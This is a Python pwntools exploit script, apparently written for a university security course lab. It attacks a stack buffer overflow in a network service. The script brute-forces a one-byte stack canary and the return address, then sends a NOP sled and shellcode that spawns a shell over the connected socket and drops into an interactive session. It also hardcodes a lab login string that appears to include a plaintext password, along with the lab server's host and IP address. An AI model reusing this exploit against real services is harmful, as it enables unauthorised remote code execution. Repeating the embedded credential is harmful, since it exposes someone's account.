#!virtualenv/bin/python2

"""Imports"""
from pwn import *

""" Global constants """
# bandit connection
USERNAME = 'inetsec024'
BANDIT = 'secenv.seclab.tuwien.ac.at'
BANDIT_PORT = 222

# live server connection from bandit
PORT = 2000
LIVE_SRV = '10.100.1.26'

LOGIN_STR = 'inetsec024:zebughai'
STR_PREFIX = 'u '
STR_POSTFIX = '\x01'
TIMEOUT = 3
MAX_BUF = 2047
PRIMARY_BUF = 128

# Configure what you want to do and guess
TEST = True  # Use localhost or the live system via ssh
GUESS_CANARY = False
GUESS_ADDRESS = True
EXPLOIT = False

if not TEST:
    # Different constants for live system
    PRIMARY_BUF = 135

""" Global variables """
ssh_conn = None


def get_tube():
    if (ssh_conn):
        return ssh_conn.connect_remote(LIVE_SRV, PORT)
    else:
        return remote('localhost', PORT)


def check_canary(char):
    with get_tube() as r:
        r.send(LOGIN_STR)
        output = r.recvuntil('> ', timeout=TIMEOUT)
#        if output:
#            print(output)

        str = STR_PREFIX + 'X' * PRIMARY_BUF + char + STR_POSTFIX

        r.send(str)
    
        output = None
        canary_found = False
        try:
            output = r.recvline_contains('STACK SMASHING DETECTED', keepends=False, timeout=TIMEOUT)
        except EOFError:
            canary_found = True
            print('EOF occured')
    
        if output:
            print(output)

        return canary_found


def guess_canary():
    canary = None

    for i in range(0, 255, 1):
        print("Testing canary 0x%02x" % i)
        if check_canary(chr(i)):
            canary = i
            break

    if canary:
        print("Canary found! It's 0x%02x" % canary)
    else:
        print("Canary not found (something went wrong)")

    return canary


def check_address(canary, address):
    with get_tube() as r:
        r.send(LOGIN_STR)
        r.recvuntil('> ', timeout=TIMEOUT)

        str = STR_PREFIX + 'A' * PRIMARY_BUF + chr(canary) + cyclic(36, n=4) + p32(address) + '\0'

        test = "!! RIGHT ADDRESS FOUND !!"

        # Shellcode
        sh = asm(shellcraft.findpeer()  # Find the socket which is connected to us
                 + shellcraft.mov('ebp', 'esi')  # Copy the socket address to ebp
                 + shellcraft.echo(test + "\n")  # Echo some text to the fd pointed to by ebp
                 + shellcraft.syscall('SYS_exit', 0))  # Exit smoothly

        # NOP sled
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

        output = None
        try:
            output = r.recvline(keepends=False, timeout=TIMEOUT)
        except EOFError:
            pass

        if output:
            print(output)

        return output and re.match(test, output)


def guess_address(canary):
    address = None

    for i in range(0xffffffff, 0xffff0101, -0x0800):
        print("Testing address 0x%08x" % i)
        if check_address(canary, i):
            address = i
            break

    if address:
        print("Address found! It's 0x%08x" % address)
    else:
        print("Address not found (something went wrong)")

    return address


def exploit(canary, address):
    with get_tube() as r:
        str = STR_PREFIX + 'A' * PRIMARY_BUF + chr(canary) + cyclic(12, n=1) + p32(address) + '\0'

        # Shellcode
        sh = asm(shellcraft.findpeersh())
        nop = asm(shellcraft.nop()) * (MAX_BUF - len(str) - len(sh))

        str += nop + sh

        r.send(str)

        r.interactive()


def main(argv):
    """ Main entry point for the script """
    global ssh_conn

    context(arch='i386', os='linux')

    """ Setup the ssh connection """
    if not TEST:
        """ Attention: This works only if your SSH key is registered at the server """
        ssh_conn = ssh(host=BANDIT, user=USERNAME, port=BANDIT_PORT)

    if GUESS_CANARY:
        canary = guess_canary()
    else:
        if TEST:
            canary = ord('i')  # Canary with on my test implementation
        else:
            canary = 0x2e  # Found out by the guess method

    if GUESS_ADDRESS:
        address = guess_address(canary)
    else:
        if TEST:
            address = 0xffffcc01  # Address on my test system
        else:
            address = 0xffffd7ff  # Found out by the guess method

    if EXPLOIT:
        exploit(canary, address)


if __name__ == '__main__':
    sys.exit(main(sys.argv))
